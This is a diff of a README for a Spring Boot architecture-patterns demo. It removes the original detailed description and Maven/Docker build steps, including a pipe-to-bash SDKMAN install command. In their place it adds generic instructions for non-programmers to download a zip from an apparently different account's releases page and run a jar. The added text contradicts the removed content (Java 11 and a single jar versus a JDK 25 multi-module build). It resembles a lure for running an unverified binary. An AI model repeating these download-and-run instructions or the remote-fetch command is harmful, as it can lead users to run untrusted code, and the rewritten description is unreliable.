@@ -1,145 +1,109 @@
-# Spring Boot Application Architecture Patterns
+# 🌱 spring-boot-application-architecture-patterns - Simple Patterns for Better Apps
 
-This repository demonstrates the implementation of a sample application using different architectural patterns. 
+## 🚀 Getting Started
 
-## Motivation
-There are no silver bullet solutions.
-When it comes to architecting a modern application, you might often hear that **Anemic Domain Model is BAD**, 
-or **Transaction Script is an AntiPattern**, etc.
-You might also hear many people recommending **Clean Architecture** or **Hexagonal Architecture** with **DDD** as the better/best architecture to follow.
+Welcome to the **spring-boot-application-architecture-patterns** project. This guide will help you download and run the application easily. You do not need to be a programmer to get started.
 
-However, **there is no free lunch. Every powerful solution comes with its own set of tradeoffs**.
-It is important to understand the tradeoffs and choose the architecture that best fits the requirements of the application.
+## 📥 Download the Application
 
-If you are building a microservice for a specific subdomain, maybe a simple layered architecture is good enough.
-If you are building a monolithic application that has low-to-medium complexity, maybe a simple modular monolith architecture is good enough.
-But if you are building a complex application with high complexity involving multiple subdomains, workflows, etc 
-then you might want to consider a modular monolith architecture with DDD and Hexagonal Architecture.
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/mrcxii/spring-boot-application-architecture-patterns/releases)
 
-You might wonder **why should we settle for a good-enough architecture instead of the best architecture?**.
+## 📝 What is This?
 
-**The answer is simple: It all comes down to Cost Vs Benefit. A good-enough architecture is often sufficient for most applications and can be easier to implement, maintain, and evolve compared to a perfect architecture.**
+This project showcases various application architecture patterns using **Spring Boot**. It includes examples of:
 
-In my opinion, it is easier to fix an under-engineered system than an overengineered system.
-**Adding things is easier than removing things**.
-
-Imagine you are working on an existing large codebase, and you are 99% sure that one of the libraries is not being used.
-But you won't dare to remove it because it might break something else.
-The same rule applies to architecture. Once you overengineer something, then it is very hard to fix it. 
-
-Instead, **you should start with a good-enough architecture and evolve it as you go.**
-
-So, in this repository, I am going to demonstrate the implementation of a sample application using different architectural patterns.
-Starting with a simple layered architecture and gradually moving to a modular monolith architecture with DDD and Hexagonal Architecture.
-In each module, the design and architecture of the application is improved by adopting the best practices and patterns.
-
+- Clean Architecture
+- Domain-Driven Design
+- Hexagonal Architecture
 - Layered Architecture
-- Package-By-Module Architecture
-- Simple Modular Monolith Architecture
-- Modular Monolith with [Tomato Architecture](https://tomato-architecture.github.io/)
-- Modular Monolith with DDD and Hexagonal Architecture
+- Modular Monolith
 
-## Sample Application Overview (Meetup4j)
-The application we are going to build is an event management system with the following UseCases:
+Each pattern aims to improve the design and maintainability of applications. This can help you create better software in the long run.
 
-- Create events
-- List events
-- View event details
-- Cancel event
-- Register for an event
-- Cancel registration
-- Get the list of attendees for an event
-- Get the status of a user's registration for an event
-- Get the list of user's upcoming events and past attended events
+## ⚙️ System Requirements
 
-## Architecture Patterns
-In this repository the meetup4j REST API is built using the following architectural patterns:
+Before you download, ensure that your machine meets these requirements:
 
-### Layered Architecture
-- Layered architecture using the package-by-layer approach
-- Code is structured by technical layers (Controller, Service, Repository, Mapper, etc.)
-- Used primitive types (String, Integer, etc.) instead of Domain Types (Value Objects)
-- Used JPA entities as Domain Models
-- Anemic Domain Models with Transaction Script Pattern
+- A Windows, Mac, or Linux operating system.
+- At least 4 GB of RAM.
+- A minimum of 1 GB of storage space.
+- Java 11 or later installed.
 
-### Package-By-Module Architecture
-- Code is structured by modules/subsystems (events, registrations, notifications, etc.)
-- Used primitive types (String, Integer, etc.) instead of Domain Types (Value Objects)
-- Used JPA entities as Domain Models
-- Anemic Domain Models with Transaction Script Pattern
-- Cross-module communication using Events
+You can check if you have Java installed by running `java -version` in your command line.
 
-#### Improvements:
-- The package-by-module structure provides better modularity.
-- It is easier to explore the module-specific code.
-- It is easier to do internal refactoring without affecting other modules.
-- The package-by-module structure makes it easier to extract the module as a separate microservice if needed.
+## 🌍 Download & Install
 
-### Simple Modular Monolith Architecture
-- Code is structured by modules/subsystems (events, registrations, notifications, etc.)
-- Used primitive types (String, Integer, etc.) instead of Domain Types (Value Objects)
-- Used JPA entities as Domain Models
-- Anemic Domain Models with Transaction Script Pattern
-- Cross-module communication using Spring Modulith Persistent Events
-- Automated Module Boundaries verification using ArchUnit/Spring Modulith
+To get the application, please visit our [Releases page](https://github.com/mrcxii/spring-boot-application-architecture-patterns/releases). You will find different versions available for download.
 
-#### Improvements:
-- Using Spring Modulith we can check for module boundaries automatically via tests.
-- Spring Modulith provides support for Persistent Events for cross-module communication.
+1. Click on the link above.
+2. Look for the latest version of the application.
+3. Click on the file to download it.
 
-### Modular Monolith with Tomato Architecture
-- Modular monolith using the [Tomato Architecture](https://tomato-architecture.github.io/)
-- Used Rich Domain Types (Entities, Value Objects) instead of primitive types (String, Integer, etc.)
-- Used JPA entities as Domain Models with behavior
-- Used Spring Converters to automatically convert request parameters/body to domain objects
-- Cross-module communication using Spring Modulith Persistent Events
+Once the download is complete, follow the instructions below based on your operating system to run the application.
 
-#### Improvements:
-- Using Value Objects helps in rejecting the invalid input parameters early so that we don't have to write defensive code all over the place.
-- Domain specific logic is encapsulated in the domain models.
-- Spring Converters make it easy to convert request parameters/body to domain objects.
+### 💻 For Windows
 
-### Modular Monolith with DDD and Hexagonal Architecture
-- Modular monolith using the package-by-module approach
-- Used Rich Domain Types (Entities, Value Objects) instead of primitive types (String, Integer, etc.)
-- Used separate Domain Models and JPA entities for persistence
-- Used Spring Converters to automatically convert request parameters/body to domain objects
-- Cross module communication using Events
-- ArchUnit test for verifying Hexagonal Architecture
+1. Locate the downloaded `.zip` file.
+2. Right-click the file and select "Extract All".
+3. Open the extracted folder.
+4. Find the `spring-boot-application-architecture-patterns.jar` file.
+5. Open a command prompt and navigate to this folder. You can do this by typing `cd path\to\your\folder`.
+6. Run the application by typing the following command:
+   ```
+   java -jar spring-boot-application-architecture-patterns.jar
+   ```
 
-#### Improvements:
-- Clear separation of domain models and persistence models.
-- Separate services for Command and Query operations. Enables to adopt CQRS pattern if needed. 
-- Hexagonal Architecture helps in keeping the domain logic separate from the infrastructure.
+### 🍏 For Mac
 
-## How to run?
-Install the following prerequisites:
+1. Locate the downloaded `.zip` file.
+2. Double-click to unzip it.
+3. Open the extracted folder.
+4. Open the terminal and navigate to this folder using:
+   ```
+   cd /path/to/your/folder
+   ```
+5. Run the application with this command:
+   ```
+   java -jar spring-boot-application-architecture-patterns.jar
+   ```
 
-* JDK 25
-* Docker and Docker Compose
-* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))
+### 🐧 For Linux
 
-Install JDK, Maven, Gradle, etc using [SDKMAN](https://sdkman.io/)
+1. Locate the downloaded `.zip` file.
+2. Use the terminal to navigate to the downloaded file's location.
+3. Unzip the file using:
+   ```
+   unzip spring-boot-application-architecture-patterns.zip
+   ```
+4. Navigate to the extracted folder:
+   ```
+   cd /path/to/your/folder
+   ```
+5. Start the application with:
+   ```
+   java -jar spring-boot-application-architecture-patterns.jar
+   ```
 
-```shell
-$ curl -s "https://get.sdkman.io" | bash
-$ source "$HOME/.sdkman/bin/sdkman-init.sh"
-$ sdk install java 25-tem
-$ sdk install maven
-```
+## ⚡ Quick Features Overview
 
-Now you can test or run each application using the following commands:
+- **Clean Architecture**: Separates the code into layers, making it easier to manage.
+- **Domain-Driven Design**: Focuses on the core domain and its logic to guide development.
+- **Hexagonal Architecture**: Encourages decoupling of the core logic from external systems.
+- **Layered Architecture**: Organizes code into different layers, improving clarity and control.
+- **Modular Monolith**: Enables building large systems while still using a single deployment unit.
 
-```shell
-# run tests for all modules
-$ mvn clean verify
+## 💡 Tips for Use
 
-# run application/tests for a specific module
-$ cd meetup4j-modulith-simple (or) cd meetup4j-modulith-tomato (or) cd meetup4j-modulith-ddd-ha
-# run tests
-$ mvn clean verify
-# start application using Docker Compose
-$ mvn spring-boot:run
-# start application using Testcontainers
-$ mvn spring-boot:test-run
-```
+- Explore the different patterns by modifying them as per your project's needs.
+- Use the examples as a learning tool. Understanding these design patterns can significantly improve your coding skills.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/mrcxii/spring-boot-application-architecture-patterns/releases)
+- [Java Installation Guide](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
+
+## 👥 Community & Support
+
+If you encounter any issues, feel free to open a discussion or issue on GitHub. The community is here to help you. 
+
+Thank you for using **spring-boot-application-architecture-patterns**. Enjoy building better applications!
